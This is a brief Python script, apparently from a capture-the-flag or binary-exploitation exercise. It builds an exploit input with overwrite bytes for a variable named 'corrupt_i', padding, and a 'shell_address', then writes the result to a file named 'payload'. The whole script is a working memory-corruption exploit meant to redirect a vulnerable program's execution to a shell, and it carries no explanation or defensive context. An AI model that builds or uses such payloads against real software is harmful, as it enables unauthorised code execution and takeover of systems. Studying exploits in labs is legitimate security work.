corrupt_i = b"\xaa"* 13 + b"\0a"
padding = b"\xaa\x0a"*23
shell_address = b"\x5d\x0a\x87\x0a\x04\x0a\x08\x0a"
payload = corrupt_i + padding + shell_address + b"\x0a"
with open("payload","wb") as file:
    file.write(payload)